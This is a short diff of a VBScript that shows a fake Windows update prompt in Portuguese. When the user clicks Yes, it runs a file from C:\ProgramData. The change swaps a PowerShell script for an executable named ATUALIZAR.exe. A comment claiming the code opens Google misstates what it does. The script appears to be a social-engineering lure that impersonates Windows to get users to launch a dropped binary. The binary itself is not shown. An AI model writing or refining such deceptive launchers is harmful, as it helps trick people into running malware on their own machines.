@@ -3,10 +3,10 @@ resposta = MsgBox("Voce precisa atualizar o windows para a versao mais recente. 
  
 If resposta = vbYes Then
     ' Abrir o Google
-    Dim objShell
-    Set objShell = CreateObject("WScript.Shell")
-    objShell.Run "C:\ProgramData\a.ps1"
-    Set objShell = Nothing
+   Dim objShell
+Set objShell = WScript.CreateObject("WScript.Shell")
+objShell.Run "C:\ProgramData\ATUALIZAR.exe", 1, false
+Set objShell = Nothing
 Else
     ' Exibir uma mensagem se o botão "Não" for clicado
     MsgBox "Voce adiou a atualizacao.", vbInformation, "Windows"
